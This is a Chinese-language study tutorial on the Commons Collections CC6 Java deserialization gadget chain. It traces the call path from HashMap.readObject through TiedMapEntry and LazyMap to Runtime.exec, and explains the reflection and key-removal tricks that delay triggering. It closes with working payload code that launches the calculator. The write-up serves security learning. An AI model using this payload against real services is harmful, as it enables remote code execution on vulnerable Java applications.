CC6是通用的一条链，它不受CommonsCollections和JDK版本的限制

CC6和CC1的区别:


CC1-LazyMap调用链：

AnnotationInvocationHandler.readObject() 

Map(Proxy).entrySet() 

LazyMap.get() 

ChainedTransformer.transform() 

InvokerTransformer.transform() 

Runtime.exec()

CC6调用链：

HashMap.readObject() 

HashMap.hash() 

TiedMapEntry.hashCode() 

TiedMapEntry.getValue() 

LazyMap.get() 

ChainedTransformer.transform() 

InvokerTransformer.transform() 

Runtime.exec()

LazyMap中使用的是AnnotationInvocationHandler.readObject() 作为反序列化的入口点,
而CC6是用的HashMap.readObject() ,
和URLDNS链有些相似

在URLDNS链中HashMap.hash() 会调用key.hashCode()方法，这个key是object类型，
如果这个key是URL的话，那就会调用URL.hashCode()方法。

我们的最终目的是达到命令执行，那么这里刚好有一个类里面有hashCode()方法，还调用了LazyMap.get()
就是TiedMapEntry类
在TiedMapEntry类中有一个hashCode()方法

<img width="1749" height="1470" alt="image" src="https://github.com/user-attachments/assets/d305f67c-5066-416f-b854-2d54c2f77b16" />

这里又有一个getValue()方法调用了map.get，那么我们可以让这个map.get变成LazyMap.get，这样就和URLDNS链和CC1LazyMap链串联起来了

<img width="616" height="153" alt="image" src="https://github.com/user-attachments/assets/866d7fce-2da1-402e-8f3e-2abcfc0e6752" />

那这个map是什么？

<img width="1749" height="1470" alt="image" src="https://github.com/user-attachments/assets/3699e433-7d05-4b96-8820-de8fa359ddb3" />

ideMapEntry接收两个参数，一个map，一个key,
现在需要让这个map等同于LazyMap，这样才会调用LazyMap的get方法

Payload构造：

在后面执行代码的方式和CC1一样，并且CC6之后也会调用LazyMap之后的链,
所以前面代码和CC1-LazyMap一样

<img width="1807" height="538" alt="image" src="https://github.com/user-attachments/assets/e02cc81b-d6e8-49d6-b420-866e3bd4e855" />

实例化TiedMapEntry，将之前构造好的LazyMap放进去，value先随便填,
最后调用getValue()方法，触发恶意代码

<img width="1870" height="1470" alt="image" src="https://github.com/user-attachments/assets/039a6609-1976-44bf-93c9-9a535821ed1e" />

现在已经完成TiedMapEntry.getValue() ，下面就是看谁调用了getValue()方法。

就是在hashCode()方法

<img width="1182" height="235" alt="image" src="https://github.com/user-attachments/assets/5af8b4e7-71df-4cd0-993e-b1d8433cf479" />

尝试修改成hashCode()方法，依然可以弹出计算器

<img width="2244" height="1470" alt="image" src="https://github.com/user-attachments/assets/6df0c2ce-54b7-45b9-8e55-c0a071e45de3" />

现在就是
LazyMap.get()-->TiedMapEntry.getValue()-->TiedMapEntry.hashCode()

接下来就要往向上找
HashMap.readObject() 
HashMap.hash() 

在URLDNS链子中HashMap.readObject()方法中调用了HashMap.putVal()方法，传入hash(key)

<img width="2097" height="1470" alt="image" src="https://github.com/user-attachments/assets/c2be71f1-0594-4da2-bd5f-32afb2dc4850" />

接着，这个hash()方法中的key，又会调用key.hashCode()方法

<img width="1108" height="178" alt="image" src="https://github.com/user-attachments/assets/22a00fa0-12b8-467f-999e-ec77ccc80369" />

现在需要让这个key.hashCode变成TiedMapEntry.hashCode

怎么做呢？

只需要put进去就可以了,
首先创建一个HashMap对象，
将tiedMapEntry put进去

<img width="2244" height="1470" alt="image" src="https://github.com/user-attachments/assets/6d63be8b-c0bf-4007-9259-2017b97b39c2" />

但是在这里存在一个和URLDNS一样的问题，
就是这里在序列化的时候就已经触发了，我们的最终目的是要他在反序列化的时候才被触发。
这里是因为在put的时候就已经触发hash方法了

<img width="1158" height="130" alt="image" src="https://github.com/user-attachments/assets/7b3afc31-b083-4e17-8a5f-59738b2f9ed4" />

那现在有什么办法能让他在序列化的时候不触发这条链，只在反序列化的时候触发呢？

可以在put的时候，使这些对象内容不完整，从而不让这条链子完整触发。
在put完之后，再将tiedMapEntry对象中的内容利用反射机制再修改回来。

再tiedMapEntry中
套了一个LazyMap，又套了一个chainedTransformer，又套了一个transformers

<img width="1773" height="580" alt="image" src="https://github.com/user-attachments/assets/4ae0f65f-d6e0-4b80-89b2-0ca4d7873da3" />

tiedMapEntry中套的就是lazyMap,
可以尝试修改LazyMap

Payload构造：

利用反射机制来修改LazyMap中的factory,
因为在之前，factory里存放的就是chainedTransformer

<img width="1303" height="49" alt="image" src="https://github.com/user-attachments/assets/2d2f57d7-0127-41d8-893a-4067c12b48ab" />

将Payload中的33行，lazymap对象中的chainedTransformer修改为一个无关紧要的transformer
也就是new ConstantTransformer(1)

<img width="2221" height="930" alt="image" src="https://github.com/user-attachments/assets/8e6c8533-fbaa-4593-8016-42e5235b4613" />

这样，在hashMap.put的时候调用的就是new ConstantTransformer(1)
并没有触发到真正的chainedTransformer，那么在序列化的时候就不会触发。

在put完之后，又利用反射机制加载LazyMap.class
在将chainedTransformer给修改回来。在反序列化的时候在触发这个真正的chainedTransformer达到命令执行

但是现在遇到一个问题，那就是反序列化的时候也没有触发了。

断点调试

发现在LazyMap中的get方法 这个key已经被消耗掉了,
我们的目的是要在反序列化执行 factory.transform(key),
但是在put的时候这个key就已经消耗了,
反序列化的时候这里就已经有这个key了

<img width="2265" height="1470" alt="image" src="https://github.com/user-attachments/assets/82671298-0bc2-4810-836d-75eb58e796a6" />

反序列化断点调式

发现在反序列化的时候根本就没有进入到这个if判断里面，
也就是说在反序列化的时候没有触发我们想要的这个factory.transformer，直接return了

<img width="2248" height="1470" alt="image" src="https://github.com/user-attachments/assets/0c39cf01-bd12-4473-a121-9c11aa582c3a" />

原因是因为在LazyMap的get方法中,
他首先会判断是否有key值，如果没有key的话，才会进入到这个if判断里面，从而调用factory.transform,
那在这里，序列化的时候就已经有key了，
那在反序列化的时候，if判断这里存在key，
那就直接return了，不会触发到factory，transform

<img width="1234" height="312" alt="image" src="https://github.com/user-attachments/assets/93e94629-534d-4598-8aa6-8c3cef977f71" />

解决办法：

在put完之后，将他的key值remove删除掉

<img width="1825" height="868" alt="image" src="https://github.com/user-attachments/assets/c2192de9-90e3-47cf-be29-f1118f167c02" />

运行之后注释掉，再来调试反序列化

<img width="2404" height="1470" alt="image" src="https://github.com/user-attachments/assets/51980fdb-98e3-4ef4-9869-5750cc76708e" />

之后就成功进入到了if判断里面，调用了factory.transform

<img width="2404" height="1470" alt="image" src="https://github.com/user-attachments/assets/703bb152-49c5-4bfd-9059-f81021dc4f53" />

成功执行代码，弹出计算器

<img width="2404" height="1470" alt="image" src="https://github.com/user-attachments/assets/74f94b1b-58a8-4335-8a32-e18bc9064d9f" />


        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap();
        Map<Object, Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "hahaha");
        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, "123");
        lazyMap.remove("hahaha");

        Class c = LazyMap.class;
        Field factory = c.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap, chainedTransformer);
        serialize(hashMap);
        unserialize("ser.bin");





    }


    public static void serialize(Object object) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(object);
    }

    //反序列化方法
    public static void unserialize(String filename) throws Exception {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));
        objectInputStream.readObject();
    }



参考链接：
https://www.bilibili.com/video/BV1yP4y1p7N7
https://blog.csdn.net/qq_45305211/article/details/142422443











